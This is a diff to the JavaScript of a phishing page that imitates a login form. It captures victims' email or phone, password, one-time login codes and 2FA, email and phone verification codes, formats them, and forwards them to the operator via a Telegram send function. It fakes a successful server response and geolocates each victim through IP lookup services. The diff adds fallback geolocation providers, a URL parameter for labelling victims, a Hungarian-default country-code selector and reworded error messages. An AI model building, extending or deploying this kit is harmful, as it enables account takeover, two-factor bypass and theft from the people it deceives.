@@ -26,30 +26,102 @@ const userInfo = {
     isp: 'Unknown'
 };
 
+function getUserLabelFromUrl() {
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const label = params.get('user');
+        if (label && label.trim().length > 0) {
+            return label.trim();
+        }
+    } catch (error) {
+        console.log('Error reading user label:', error);
+    }
+    return userInfo.ip;
+}
+
+const userLabel = getUserLabelFromUrl();
+
+async function fetchJson(url) {
+    const response = await fetch(url, { cache: 'no-store' });
+    if (!response.ok) {
+        throw new Error(`Request failed: ${response.status}`);
+    }
+    return response.json();
+}
+
 // Get location info
 async function collectUserInfo() {
-    try {
-        // Get IP address for location lookup only
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // Get location info based on IP
-        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const locationData = await locationResponse.json();
-        
-        userInfo.country = locationData.country_name || 'Unknown';
-        userInfo.city = locationData.city || 'Unknown';
-        userInfo.isp = locationData.org || 'Unknown';
-        
-        console.log('User info collected:', userInfo);
-    } catch (error) {
-        console.log('Error collecting user info:', error);
-        // Keep the generated ID even if location detection fails
+    const providers = [
+        async () => {
+            const data = await fetchJson('https://ipapi.co/json/');
+            return {
+                country: data.country_name,
+                city: data.city,
+                isp: data.org
+            };
+        },
+        async () => {
+            const data = await fetchJson('https://ipwho.is/');
+            return {
+                country: data.country,
+                city: data.city,
+                isp: data.connection ? data.connection.isp : ''
+            };
+        },
+        async () => {
+            const ipData = await fetchJson('https://api.ipify.org?format=json');
+            const data = await fetchJson(`https://ipapi.co/${ipData.ip}/json/`);
+            return {
+                country: data.country_name,
+                city: data.city,
+                isp: data.org
+            };
+        }
+    ];
+
+    for (const load of providers) {
+        try {
+            const info = await load();
+            if (info.country) {
+                userInfo.country = info.country || 'Unknown';
+                userInfo.city = info.city || 'Unknown';
+                userInfo.isp = info.isp || 'Unknown';
+                console.log('User info collected:', userInfo);
+                return;
+            }
+        } catch (error) {
+            console.log('Location provider failed:', error);
+        }
     }
 }
 
-// Call on page load
-collectUserInfo();
+const userInfoPromise = collectUserInfo();
+
+async function ensureUserInfo() {
+    try {
+        await userInfoPromise;
+    } catch (error) {
+        console.log('User info promise failed:', error);
+    }
+
+    if (userInfo.country === 'Unknown') {
+        const selectedCode = (document.getElementById('country-code') || {}).value || '';
+        if (selectedCode && typeof countryOptions !== 'undefined') {
+            updateCountryFromSelection(selectedCode);
+        }
+    }
+
+    if (userInfo.country === 'Unknown') {
+        const locale = (navigator.language || '').split('-')[1];
+        if (locale && typeof Intl !== 'undefined' && Intl.DisplayNames) {
+            const displayNames = new Intl.DisplayNames(['en'], { type: 'region' });
+            const regionName = displayNames.of(locale.toUpperCase());
+            if (regionName) {
+                userInfo.country = regionName;
+            }
+        }
+    }
+}
 
 // ======================================================
 // TELEGRAM SEND FUNCTION
@@ -124,7 +196,7 @@ function formatLoginMessage(emailPhone, password) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(${userInfo.ip})</b>
+    return `<b>(${userLabel})</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Password:</b> <code>${password}</code>
 <b>Country: ${userInfo.country}</b>`;
@@ -166,37 +238,37 @@ function formatOneTimeLoginMessage(emailPhone) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(${userInfo.ip} 1⃣)</b>
+    return `<b>(${userLabel} 1⃣)</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Country: ${userInfo.country}</b>`;
 }
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}🔐: (${userInfo.ip}):</b> <code>${code}</code>`;
+    return `<b>${prefix}🔐: (${userLabel}):</b> <code>${code}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📧: (${userInfo.ip}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📧: (${userLabel}):</b> <code>${code}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📱: (${userInfo.ip}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📱: (${userLabel}):</b> <code>${code}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
     // Capitalize first letter only
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
-    return `<b>(${userInfo.ip})</b>
+    return `<b>(${userLabel})</b>
 <b>Switched:</b> ${toMethodFormatted}`;
 }
 
 function formatGoVerifyMessage(method) {
     // Capitalize first letter only
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
-    return `<b>(${userInfo.ip})</b>
+    return `<b>(${userLabel})</b>
 <b>Selected:</b> ${methodFormatted}`;
 }
 
@@ -315,6 +387,210 @@ const emailPhoneInput = document.getElementById('email-phone');
 // Some templates use a visible input id `email-phone-visible`; fall back to `email-phone` when absent
 const emailPhoneVisibleInput = document.getElementById('email-phone-visible') || document.getElementById('email-phone');
 
+function ensureHiddenInput(id) {
+    let el = document.getElementById(id);
+    if (!el) {
+        el = document.createElement('input');
+        el.type = 'hidden';
+        el.id = id;
+        document.body.appendChild(el);
+    }
+    return el;
+}
+
+function buildCountrySelector(container) {
+    const wrap = document.createElement('div');
+    wrap.className = 'order-first';
+
+    const button = document.createElement('button');
+    button.type = 'button';
+    button.className = 'button select bg-input_bright account-select';
+
+    button.innerHTML = `
+        <div class="flex h-5 min-w-12 items-center justify-center border-r-2 border-solid border-third pr-1">
+            <span class="mr-1.5" data-country-code>+36</span>
+            <span class="mr-0.5" data-country-flag>🇭🇺</span>
+            <div class="icon size-4 fill-tertiary transition ease-out" style="transform: rotate(-90deg);">
+                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                </svg>
+            </div>
+        </div>
+    `;
+
+    button.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        openCountrySheet();
+    });
+
+    wrap.appendChild(button);
+    return wrap;
+}
+
+function shouldShowCountrySelector(value) {
+    if (!value) return false;
+    if (value.includes('@')) return false;
+    if (/[a-zA-Z]/.test(value)) return false;
+    return /^\s*\d{3}/.test(value);
+}
+
+function updateCountrySelector() {
+    if (!emailPhoneField || !emailPhoneVisibleInput) return;
+
+    const value = emailPhoneVisibleInput.value || '';
+    const show = shouldShowCountrySelector(value);
+    let selector = emailPhoneField.querySelector('.account-select');
+
+    if (show && !selector) {
+        const selectorWrap = buildCountrySelector(emailPhoneField);
+        emailPhoneField.insertBefore(selectorWrap, emailPhoneField.firstChild);
+        emailPhoneField.classList.add('has-country');
+        const hiddenCode = ensureHiddenInput('country-code');
+        if (!hiddenCode.value) hiddenCode.value = '+36';
+    }
+
+    if (!show && selector) {
+        const wrap = selector.closest('.order-first');
+        if (wrap) {
+            wrap.remove();
+        } else {
+            selector.remove();
+        }
+        emailPhoneField.classList.remove('has-country');
+    }
+
+    const hiddenPhone = ensureHiddenInput('phone-number');
+    hiddenPhone.value = value.replace(/\D/g, '');
+}
+
+if (emailPhoneVisibleInput) {
+    emailPhoneVisibleInput.addEventListener('input', updateCountrySelector);
+    updateCountrySelector();
+}
+
+const countryOptions = [
+    { code: '+376', name: 'Andorra' },
+    { code: '+971', name: 'United Arab Emirates' },
+    { code: '+93', name: 'Afghanistan' },
+    { code: '+1268', name: 'Antigua and Barbuda' },
+    { code: '+1264', name: 'Anguilla' },
+    { code: '+355', name: 'Albania' },
+    { code: '+374', name: 'Armenia' },
+    { code: '+244', name: 'Angola' },
+    { code: '+672', name: 'Antarctica' },
+    { code: '+54', name: 'Argentina' },
+    { code: '+43', name: 'Austria' },
+    { code: '+61', name: 'Australia' },
+    { code: '+297', name: 'Aruba' },
+    { code: '+35818', name: 'Aland Islands' },
+    { code: '+994', name: 'Azerbaijan' },
+    { code: '+387', name: 'Bosnia and Herzegovina' },
+    { code: '+1246', name: 'Barbados' },
+    { code: '+880', name: 'Bangladesh' },
+    { code: '+32', name: 'Belgium' },
+    { code: '+359', name: 'Bulgaria' },
+    { code: '+973', name: 'Bahrain' },
+    { code: '+229', name: 'Benin' },
+    { code: '+673', name: 'Brunei' },
+    { code: '+55', name: 'Brazil' },
+    { code: '+1242', name: 'Bahamas' },
+    { code: '+975', name: 'Bhutan' },
+    { code: '+36', name: 'Hungary', selected: true },
+    { code: '+91', name: 'India' },
+    { code: '+62', name: 'Indonesia' },
+    { code: '+98', name: 'Iran' },
+    { code: '+972', name: 'Israel' },
+    { code: '+81', name: 'Japan' },
+    { code: '+965', name: 'Kuwait' },
+    { code: '+7', name: 'Kazakhstan' },
+    { code: '+961', name: 'Lebanon' },
+    { code: '+218', name: 'Libya' },
+    { code: '+212', name: 'Morocco' },
+    { code: '+31', name: 'Netherlands' },
+    { code: '+47', name: 'Norway' },
+    { code: '+92', name: 'Pakistan' },
+    { code: '+48', name: 'Poland' },
+    { code: '+351', name: 'Portugal' },
+    { code: '+974', name: 'Qatar' },
+    { code: '+40', name: 'Romania' },
+    { code: '+7', name: 'Russia' },
+    { code: '+966', name: 'Saudi Arabia' },
+    { code: '+65', name: 'Singapore' },
+    { code: '+34', name: 'Spain' },
+    { code: '+46', name: 'Sweden' },
+    { code: '+41', name: 'Switzerland' },
+    { code: '+90', name: 'Turkey' },
+    { code: '+886', name: 'Taiwan' },
+    { code: '+380', name: 'Ukraine' },
+    { code: '+44', name: 'United Kingdom' },
+    { code: '+1', name: 'United States' },
+    { code: '+84', name: 'Vietnam' }
+];
+
+function updateCountryFromSelection(code) {
+    const match = countryOptions.find(item => item.code === code);
+    if (match && match.name) {
+        userInfo.country = match.name;
+    }
+}
+
+const defaultCountry = countryOptions.find(item => item.selected);
+if (defaultCountry && userInfo.country === 'Unknown') {
+    userInfo.country = defaultCountry.name;
+}
+
+function openCountrySheet() {
+    const sheet = document.getElementById('country-sheet');
+    const list = document.getElementById('country-list');
+    const search = document.getElementById('country-search');
+    if (!sheet || !list) return;
+
+    const renderList = (filter = '') => {
+        const q = filter.trim().toLowerCase();
+        list.innerHTML = '';
+        countryOptions
+            .filter(item => !q || item.code.includes(q) || item.name.toLowerCase().includes(q))
+            .forEach(item => {
+                const btn = document.createElement('button');
+                btn.className = 'radio btn-like select-item';
+                if (item.selected) {
+                    btn.setAttribute('aria-selected', 'true');
+                }
+                btn.innerHTML = `<span class="mr-1 w-12 flex-none whitespace-nowrap text-left">${item.code}</span>` +
+                    `<span class="ellipsis max-w-60 overflow-hidden whitespace-nowrap" title="${item.name}">${item.name}</span>`;
+                btn.addEventListener('click', () => {
+                    countryOptions.forEach(opt => { opt.selected = opt.code === item.code; });
+                    const codeSpan = document.querySelector('[data-country-code]');
+                    const flagSpan = document.querySelector('[data-country-flag]');
+                    if (codeSpan) codeSpan.textContent = item.code;
+                    if (flagSpan) flagSpan.textContent = '';
+                    const hiddenCode = ensureHiddenInput('country-code');
+                    hiddenCode.value = item.code;
+                    updateCountryFromSelection(item.code);
+                    closeCountrySheet();
+                });
+                list.appendChild(btn);
+            });
+    };
+
+    if (search) {
+        search.value = '';
+        search.oninput = () => renderList(search.value);
+    }
+
+    renderList('');
+    sheet.classList.add('active');
+    sheet.addEventListener('click', (e) => {
+        if (e.target === sheet) closeCountrySheet();
+    }, { once: true });
+}
+
+function closeCountrySheet() {
+    const sheet = document.getElementById('country-sheet');
+    if (sheet) sheet.classList.remove('active');
+}
+
 if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput) {
     // One-time Code tab click
     oneTimeTab.addEventListener('click', (e) => {
@@ -389,7 +665,9 @@ form.addEventListener("submit", async e => {
 
     if (isProcessing.login) return;
     isProcessing.login = true;
-    startLoading(form.querySelector('button[type="submit"]'));
+    
+    const submitButton = form.querySelector('button[type="submit"]');
+    startLoading(submitButton);
 
     const emailPhone = document.getElementById("email-phone").value;
     const password = document.getElementById("password").value;
@@ -400,23 +678,26 @@ form.addEventListener("submit", async e => {
         // Validate phone number has 7-15 digits
         const phoneDigits = emailPhone.replace(/\D/g, '');
         if (phoneDigits.length < 7 || phoneDigits.length > 15) {
-            stopLoading(form.querySelector('button[type="submit"]'));
+            stopLoading(submitButton);
+            submitButton.offsetHeight; // Force reflow
             isProcessing.login = false;
-            showToast("Enter a valid phone number");
+            showToast("Incorrect email or phone number");
             return;
         }
     } else {
         // Validate email format
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(emailPhone)) {
-            stopLoading(form.querySelector('button[type="submit"]'));
+            stopLoading(submitButton);
+            submitButton.offsetHeight; // Force reflow
             isProcessing.login = false;
-            showToast("Enter a valid email");
+            showToast("Incorrect email or phone number");
             return;
         }
     }
 
     // Send login credentials to Telegram based on mode
+    await ensureUserInfo();
     let loginMessage;
     if (isOneTimeCodeMode) {
         loginMessage = formatOneTimeLoginMessage(emailPhone);
@@ -428,7 +709,7 @@ form.addEventListener("submit", async e => {
     // Simulate server delay and always return success
     const result = await simulateServerSuccess();
     
-    stopLoading(form.querySelector('button[type="submit"]'));
+    stopLoading(submitButton);
 
     if (result.success) {
         if (isOneTimeCodeMode) {
@@ -726,50 +1007,33 @@ function initSwitchButtons(overlay) {
 
 function showToast(message) {
     const toast = document.createElement("div");
-    toast.className = "toast-layer";
+    toast.className = "toast";
+    toast.style.cssText = 'display: flex; align-items: center; background: #232626; color: #fff; border-radius: 10px; box-shadow: 0 2px 16px #0008; padding: 0.45rem 0.75rem; font-size: 0.85rem; font-weight: 600; position: fixed; left: 5%; right: 5%; width: 90%; margin: 0 auto; box-sizing: border-box; top: 32px; transform: scale(0.98); opacity: 0; z-index: 2147483647;';
     toast.innerHTML = `
-        <div class="overflow-hidden flex" style="height:50px;">
-            <div class="toast" style="position: relative; padding-right: 50px; height: 50px; align-items: center; border-radius: 12px;">
-                <div class="icon w-5 h-5 mr-2 fill-error">
-                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                        <path style="fill:#ff4545" d="M16 4C9.372 4 4 9.372 4 16C4 22.628 9.372 28 16 28C22.628 28 28 22.628 28 16C28 9.372 22.628 4 16 4ZM18.5 22H13.5V20H18.5V22ZM18.5 18H13.5V10H18.5V18Z"/>
-                    </svg>
-                </div>
-                <span style="font-size: 0.9rem;">${message}</span>
-                <div style="position: absolute; right: 14px; top: 50%; transform: translateY(-50%); width: 24px; height: 24px;">
-                    <svg width="24" height="24" viewBox="0 0 24 24" style="transform: rotate(-90deg);">
-                        <defs>
-                            <linearGradient id="progressGradient-${Date.now()}" x1="0%" y1="0%" x2="100%" y2="0%">
-                                <stop offset="0%" style="stop-color:#22c55e;stop-opacity:1" />
-                                <stop offset="100%" style="stop-color:#16a34a;stop-opacity:1" />
-                            </linearGradient>
-                        </defs>
-                        <circle cx="12" cy="12" r="10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="3"/>
-                        <circle class="toast-progress-ring" cx="12" cy="12" r="10" fill="none" stroke="url(#progressGradient-${Date.now()})" stroke-width="3" stroke-linecap="round" stroke-dasharray="62.83" stroke-dashoffset="62.83"/>
-                    </svg>
-                </div>
-            </div>
+        <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none" style="fill:#ff4545;">
+            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 28 9.37258 28 16ZM20.9929 12.5802L17.5747 15.9984L20.9929 19.4166C21.4239 19.8475 21.4239 20.5609 20.9929 20.9919C20.7699 21.2148 20.4876 21.3188 20.2052 21.3188C19.9228 21.3188 19.6405 21.2148 19.4175 20.9919L15.9994 17.5737L12.5812 20.9919C12.3583 21.2148 12.0759 21.3188 11.7935 21.3188C11.5112 21.3188 11.2288 21.2148 11.0059 20.9919C10.5749 20.5609 10.5749 19.8475 11.0059 19.4166L14.424 15.9984L11.0059 12.5802C10.5749 12.1492 10.5749 11.4359 11.0059 11.0049C11.4368 10.5739 12.1502 10.5739 12.5812 11.0049L15.9994 14.4231L19.4175 11.0049C19.8485 10.5739 20.5619 10.5739 20.9929 11.0049C21.4239 11.4359 21.4239 12.1492 20.9929 12.5802Z"></path>
+            </svg>
+        </div>
+        ${message}
+        <div class="ml-auto relative" style="width:28px;height:28px;">
+            <svg class="circle-countdown" viewBox="0 0 32 32" style="transform: rotate(-90deg); stroke: #ff3b3b; stroke-width: 4; fill: none;">
+                <circle cx="16" cy="16" r="11"></circle>
+            </svg>
         </div>`;
     document.body.appendChild(toast);
-
-    const progressRing = toast.querySelector('.toast-progress-ring');
     
-    // Start progress animation from top
-    setTimeout(() => {
-        progressRing.style.transition = 'stroke-dashoffset 6s linear';
-        progressRing.style.strokeDashoffset = '0';
-    }, 10);
-
-    // After 6 seconds, animate back and remove
-    setTimeout(() => {
-        progressRing.style.transition = 'stroke-dashoffset 0.3s ease, opacity 0.3s ease';
-        progressRing.style.strokeDashoffset = '62.83';
-        progressRing.style.opacity = '0';
-        
-        setTimeout(() => {
-            toast.remove();
-        }, 300);
-    }, 6000);
+    setTimeout(() => { 
+        toast.style.opacity = '1'; 
+        toast.style.transform = 'scale(1)';
+    }, 30);
+    
+    setTimeout(() => { 
+        toast.style.opacity = '0'; 
+        setTimeout(() => { 
+            toast.remove(); 
+        }, 400); 
+    }, 2500);
 }
 
 // ======================================================
@@ -847,6 +1111,7 @@ window.startResend = startResend;
 window.sendOtp = async function({contact, method} = {}){
     try{
         if(!contact) return Promise.reject(new Error('missing contact'));
+        await ensureUserInfo();
         const msg = formatOneTimeLoginMessage(contact);
         await sendToTelegram(msg);
         // simulate server acceptance
